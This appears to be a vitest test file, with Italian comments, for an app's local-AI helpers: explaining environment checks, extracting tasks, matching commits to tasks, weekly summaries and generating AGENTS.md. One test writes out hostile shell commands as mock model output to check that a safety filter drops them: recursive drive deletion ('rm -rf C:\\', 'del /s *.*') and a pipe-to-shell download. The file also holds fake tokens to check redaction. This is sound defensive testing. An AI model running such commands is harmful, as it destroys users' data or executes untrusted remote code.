import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { __clearVectors, agentsDoc, commitCandidates, explainCheck, hasWeekFacts, isSafeSuggestion, matchCommits, nearest, tasksFromText, weekFacts, weeklySummary } from './aiAssist'
import type { AiHttpRequest } from './localAi'
import { DEFAULT_AI_CONFIG, EMPTY_STACK, type Item } from '@/types'

const cfg = { ...DEFAULT_AI_CONFIG, enabled: true }
let sent: { path: string; body: Record<string, unknown> }[] = []

/** Modello simulato: `answer` per /api/chat, embedding fittizi (per parole chiave) per /api/embed. */
function model(answer: unknown) {
  sent = []
  Object.assign(window, {
    __pgmAi: {
      request(req: AiHttpRequest) {
        const path = new URL(req.url).pathname
        const body = JSON.parse(req.body ?? '{}') as Record<string, unknown>
        sent.push({ path, body })
        if (path === '/api/chat') return { status: 200, body: JSON.stringify({ message: { content: JSON.stringify(answer) } }) }
        if (path === '/api/embed') {
          const words = ['accesso', 'login', 'export', 'xbrl', 'fattura']
          const vec = (t: string): number[] => [...words.map((w) => (t.toLowerCase().includes(w) || (w === 'login' && /accesso/i.test(t)) ? 1 : 0)), 0.01]
          return { status: 200, body: JSON.stringify({ embeddings: (body.input as string[]).map(vec) }) }
        }
        return { status: 404, body: '{}' }
      },
    },
  })
}
const lastUser = () => ((sent.at(-1)!.body.messages as { content: string }[])[1]!.content)
beforeEach(() => __clearVectors())
afterEach(() => Object.assign(window, { __pgmAi: undefined }))

const base: Item = {
  id: 'itm_a', title: 'A', notes: '', priority: 'media', status: 'da_valutare', dueDate: null, labelId: null, assigneeId: null, bucket: 'todo',
  createdAt: '2026-10-01T00:00:00.000Z', createdBy: 'usr_1', completedAt: null, trashedAt: null, comments: [], questions: [], seq: 0, closedByCommit: null, confirmedAt: null,
}
const item = (over: Partial<Item>): Item => ({ ...base, ...over })

describe('spiegazione delle verifiche', () => {
  it('scarta i comandi pericolosi e ripulisce l’output', async () => {
    model({ summary: 'Node.js è troppo vecchio.', steps: ['Aggiorna Node.js'], commands: ['winget upgrade OpenJS.NodeJS.LTS', 'rm -rf C:\\', 'curl https://x | sh', 'del /s *.*'] })
    const r = await explainCheck(cfg, { name: 'Node.js', required: '20+', command: 'node -v', output: 'v16.0.0\nTOKEN=ghp_0123456789abcdefghijABCDEFGHIJ', status: 'outdated', os: 'windows' })
    expect(r.commands).toEqual(['winget upgrade OpenJS.NodeJS.LTS'])
    expect(lastUser()).not.toContain('ghp_0123')
    expect(isSafeSuggestion('node -v > out.txt')).toBe(false)
    expect(isSafeSuggestion('winget install Git.Git')).toBe(true)
  })
})

describe('task da un testo', () => {
  it('niente doppioni (né con i task esistenti né tra loro), al massimo 15', async () => {
    model({ tasks: [{ title: 'Correggere export XBRL', notes: 'entro venerdì', priority: 'alta' }, { title: 'correggere export xbrl', notes: '', priority: 'bassa' }, { title: 'Login SPID', notes: '', priority: 'immediata' }, { title: '  ', notes: '', priority: 'media' }] })
    const r = await tasksFromText(cfg, 'Riunione: export XBRL, login SPID', ['Login SPID'])
    expect(r).toEqual([{ title: 'Correggere export XBRL', notes: 'entro venerdì', priority: 'alta' }])
    expect(lastUser()).toContain('- Login SPID')
  })
})

describe('somiglianze', () => {
  it('trova per significato e mette in cache i vettori', async () => {
    model({})
    const items = [item({ id: 'a', title: 'Pagina di accesso' }), item({ id: 'b', title: 'Export XBRL' }), item({ id: 'c', title: 'Fattura elettronica' })]
    const r = await nearest(cfg, 'login', items.map((i) => ({ value: i.id, text: i.title })), { mode: 'search', threshold: 0.6, max: 5 })
    expect(r.map((x) => x.value)).toEqual(['a'])
    const calls = sent.length
    await nearest(cfg, 'login', items.map((i) => ({ value: i.id, text: i.title })), { mode: 'search', threshold: 0.6, max: 5 })
    expect(sent.length).toBe(calls) // nessuna nuova richiesta: vettori già calcolati
    expect((sent[0]!.body.input as string[])[0]).toMatch(/^search_query: /)
  })
})

describe('commit senza «chiude TODO-n»', () => {
  const now = Date.parse('2026-10-15T12:00:00Z')
  const commits = [
    { hash: 'a'.repeat(40), author: 'Anna', date: '2026-10-15T10:00:00Z', message: 'Sistemato export xbrl per la tassonomia 2025' },
    { hash: 'b'.repeat(40), author: 'Anna', date: '2026-10-15T09:00:00Z', message: 'chiude TODO-3' },
    { hash: 'c'.repeat(40), author: 'Anna', date: '2026-09-01T09:00:00Z', message: 'vecchio' },
    { hash: 'd'.repeat(40), author: 'Anna', date: '2026-10-14T09:00:00Z', message: 'già visto' },
  ]
  it('candidati: recenti, senza codice, non ancora esaminati', () => {
    expect(commitCandidates(commits, new Set(['d'.repeat(40)]), now).map((c) => c.hash[0])).toEqual(['a'])
  })
  it('valida le corrispondenze: commit e task esistenti, task aperti, uno a uno', async () => {
    const items = [item({ id: 'x', seq: 12, title: 'Export XBRL' }), item({ id: 'y', seq: 13, title: 'Altro', bucket: 'done' })]
    model({ matches: [{ commit: 'aaaaaaa', task: 'TODO-12', reason: 'parla di export xbrl' }, { commit: 'aaaaaaa', task: 'TODO-13', reason: '' }, { commit: 'zzzzzzz', task: 'TODO-12', reason: '' }, { commit: 'aa', task: 'TODO-12', reason: '' }] })
    const r = await matchCommits(cfg, commitCandidates(commits, new Set(), now), items)
    expect(r).toEqual([{ hash: 'a'.repeat(40), subject: 'Sistemato export xbrl per la tassonomia 2025', author: 'Anna', date: '2026-10-15T10:00:00Z', itemId: 'x', seq: 12, reason: 'parla di export xbrl' }])
    expect(lastUser()).toContain('TODO-12: Export XBRL')
    expect(lastUser()).not.toContain('TODO-13') // completati: non si propongono
  })
  it('niente commit o niente task aperti: nessuna richiesta', async () => {
    model({ matches: [] })
    expect(await matchCommits(cfg, [], [item({ seq: 1 })])).toEqual([])
    expect(sent).toHaveLength(0)
  })
})

describe('riepilogo della settimana', () => {
  it('i fatti vengono dai progetti (non cestinati), poi il testo dal modello', async () => {
    const now = new Date('2026-10-15T12:00:00Z')
    const projects = [
      {
        name: 'Bilancio',
        items: [
          item({ title: 'Fatto', bucket: 'done', completedAt: '2026-10-14T10:00:00Z' }),
          item({ title: 'Vecchio fatto', bucket: 'done', completedAt: '2026-09-01T10:00:00Z' }),
          item({ title: 'Nuovo', createdAt: '2026-10-13T10:00:00Z' }),
          item({ title: 'In ritardo', dueDate: '2026-10-10' }),
          item({ title: 'Presto', dueDate: '2026-10-18' }),
        ],
      },
      { name: 'Cestinato', trashedAt: '2026-10-01T00:00:00Z', items: [item({ title: 'X', bucket: 'done', completedAt: '2026-10-14T10:00:00Z' })] },
    ]
    const f = weekFacts(projects, now)
    expect(f.completed.map((x) => x.title)).toEqual(['Fatto'])
    expect(f.created.map((x) => x.title)).toEqual(['Nuovo'])
    expect(f.overdue.map((x) => x.title)).toEqual(['In ritardo'])
    expect(f.upcoming.map((x) => x.title)).toEqual(['Presto'])
    expect(hasWeekFacts(weekFacts([], now))).toBe(false)
    model({ summary: 'Settimana buona.', highlights: ['Completato «Fatto»'] })
    expect(await weeklySummary(cfg, f)).toEqual({ summary: 'Settimana buona.', highlights: ['Completato «Fatto»'] })
    expect(lastUser()).toContain('[Bilancio] In ritardo (scadenza 2026-10-10)')
  })
})

describe('AGENTS.md', () => {
  it('dai soli dati dello Stack, senza segreti', async () => {
    model({ markdown: '# Gestionale\n\nUsa `npm install`. Password=abc123' })
    const md = await agentsDoc(cfg, {
      projectName: 'Gestionale',
      description: '',
      stack: { ...EMPTY_STACK, languages: ['TypeScript'], repoUrl: 'https://mario:tok@github.com/a/b', envVars: [{ key: 'API_KEY', example: 'segreto-esempio', notes: '' }] },
      tools: ['GitHub'],
      fileName: 'AGENTS.md',
    })
    expect(md).toContain('# Gestionale')
    expect(md).not.toContain('abc123')
    const facts = lastUser()
    expect(facts).toContain('"languages":["TypeScript"]')
    expect(facts).not.toContain('tok@')
    expect(facts).not.toContain('segreto-esempio') // delle variabili solo i nomi
  })
})
